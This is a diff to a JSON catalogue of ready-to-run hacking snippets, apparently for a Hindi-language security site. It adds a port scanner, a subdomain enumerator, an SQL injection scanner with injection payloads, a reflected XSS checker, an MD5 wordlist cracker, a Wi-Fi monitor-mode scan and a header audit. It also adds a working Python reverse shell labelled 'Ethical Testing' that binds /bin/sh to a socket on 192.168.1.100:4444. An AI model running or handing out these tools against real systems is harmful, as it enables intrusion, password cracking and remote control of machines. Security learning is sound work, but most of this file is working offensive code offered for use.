@@ -1,18 +1,66 @@
 [
   {
     "id": 1,
-    "title": "Basic Port Scanner",
+    "title": "Fast IP & Open Port Scanner",
     "category": "Networking",
     "language": "Python",
-    "description": "यह कोड टारगेट IP के ओपन पोर्ट्स चेक करता है।",
-    "code": "import socket\ntarget = '127.0.0.1'\nfor port in range(1, 1024):\n    s = socket.socket()\n    s.settimeout(0.5)\n    if s.connect_ex((target, port)) == 0:\n        print(f'Port {port} is open')"
+    "description": "यह कोड किसी भी टारगेट IP या डोमेन के ओपन पोर्ट्स तेज़ी से स्कैन करता है।",
+    "code": "import socket\n\ndef scan_target(target_ip, ports):\n    print(f'Scanning {target_ip}...')\n    for port in ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(0.5)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            print(f'[+] Port {port}: OPEN')\n        sock.close()\n\ntarget = '127.0.0.1'\nports_to_scan = [21, 22, 80, 443, 8080]\nscan_target(target, ports_to_scan)"
   },
   {
     "id": 2,
-    "title": "Base64 Decoder",
-    "category": "Hashing",
+    "title": "Subdomain Finder / Enumerator",
+    "category": "OSINT & Recon",
     "language": "Python",
-    "description": "Base64 स्ट्रिंग को डिकोड करने का स्क्रिप्ट।",
-    "code": "import base64\nencoded = 'SGVsbG8=' \nprint(base64.b64decode(encoded).decode())"
+    "description": "वर्डलिस्ट का इस्तेमाल करके किसी वेबसाइट के छुपे हुए सब-डोमेन (Subdomains) ढूँढता है।",
+    "code": "import requests\n\ndef check_subdomains(domain, subdomains):\n    for sub in subdomains:\n        url = f'http://{sub}.{domain}'\n        try:\n            res = requests.get(url, timeout=2)\n            if res.status_code == 200:\n                print(f'[+] Found Subdomain: {url}')\n        except requests.ConnectionError:\n            pass\n\nsub_list = ['admin', 'mail', 'test', 'dev', 'api']\ncheck_subdomains('example.com', sub_list)"
+  },
+  {
+    "id": 3,
+    "title": "Automated SQL Injection Scanner",
+    "category": "Web Security",
+    "language": "Python",
+    "description": "वेबसाइट के URL पैरामीटर्स में बेसिक SQLi कमियों की जाँच करता है।",
+    "code": "import requests\n\ndef check_sqli(url):\n    payloads = [\"'\", \"' OR '1'='1\", \"' OR 1=1 --\"]\n    for payload in payloads:\n        target_url = f'{url}{payload}'\n        res = requests.get(target_url)\n        if 'SQL syntax' in res.text or 'mysql_fetch' in res.text:\n            print(f'[!] Potential SQLi Found with Payload: {payload}')\n            return True\n    print('[-] No basic SQLi detected.')\n    return False\n\ncheck_sqli('http://testphp.vulnweb.com/artists.php?artist=1')"
+  },
+  {
+    "id": 4,
+    "title": "XSS Vulnerability Checker",
+    "category": "Web Security",
+    "language": "Python",
+    "description": "इनपुट फॉर्म्स और पैरामीटर्स में क्रॉस-साइट स्क्रिप्टिंग (XSS) टेस्ट करता है।",
+    "code": "import requests\n\ndef test_xss(url):\n    payload = '<script>alert(\"XSS\")</script>'\n    target_url = f'{url}?q={payload}'\n    response = requests.get(target_url)\n    if payload in response.text:\n        print('[!] Vulnerable to Reflected XSS!')\n    else:\n        print('[-] Safe from basic XSS.')\n\ntest_xss('http://example.com/search')"
+  },
+  {
+    "id": 5,
+    "title": "MD5 / SHA256 Password Hash Cracker",
+    "category": "Cryptography",
+    "language": "Python",
+    "description": "वर्डलिस्ट की मदद से MD5 हैश को डिक्रिप्ट/क्रैक करने का टूल।",
+    "code": "import hashlib\n\ndef crack_md5(target_hash, wordlist_file):\n    try:\n        with open(wordlist_file, 'r') as file:\n            for word in file.readlines():\n                word = word.strip()\n                if hashlib.md5(word.encode()).hexdigest() == target_hash:\n                    print(f'[+] Hash Cracked! Password is: {word}')\n                    return word\n        print('[-] Password not found in wordlist.')\n    except FileNotFoundError:\n        print('[!] Wordlist file not found.')\n\n# Example usage:\n# crack_md5('5f4dcc3b5aa765d61d8327deb882cf99', 'passwords.txt')"
+  },
+  {
+    "id": 6,
+    "title": "Python Reverse Shell (Ethical Testing)",
+    "category": "Payloads",
+    "language": "Python",
+    "description": "सुरक्षित पेन-टेस्टिंग लैब में रिमोट कमांड एक्ज़ीक्यूशन के लिए बेसिक रिवर्स शेल।",
+    "code": "import socket, subprocess, os\n\ndef connect_shell(ip, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, port))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    subprocess.call(['/bin/sh', '-i'])\n\n# Usage: connect_shell('192.168.1.100', 4444)"
+  },
+  {
+    "id": 7,
+    "title": "Bash Wi-Fi Network Interface Scanner",
+    "category": "Networking",
+    "language": "Bash",
+    "description": "आस-पास के Wi-Fi नेटवर्क और उनके BSSID को स्कैन करने के लिए शेल स्क्रिप्ट।",
+    "code": "#!/bin/bash\nINTERFACE='wlan0'\n\necho '[+] Putting interface into Monitor Mode...'\nsudo ip link set $INTERFACE down\nsudo iwconfig $INTERFACE mode monitor\nsudo ip link set $INTERFACE up\n\necho '[+] Scanning nearby Wi-Fi networks...'\nsudo airodump-ng $INTERFACE"
+  },
+  {
+    "id": 8,
+    "title": "HTTP Header Security Audit",
+    "category": "Web Security",
+    "language": "Python",
+    "description": "वेबसाइट के सिक्योरिटी हेडर्स (CSP, HSTS, X-Frame-Options) की जाँच करता है।",
+    "code": "import requests\n\ndef audit_headers(url):\n    res = requests.get(url)\n    headers = res.headers\n    sec_headers = ['Content-Security-Policy', 'Strict-Transport-Security', 'X-Frame-Options', 'X-Content-Type-Options']\n    \n    print(f'Audit Report for {url}:')\n    for h in sec_headers:\n        if h in headers:\n            print(f'[✔] {h}: Present')\n        else:\n            print(f'[✘] {h}: MISSING!')\n\naudit_headers('https://google.com')"
   }
 ]
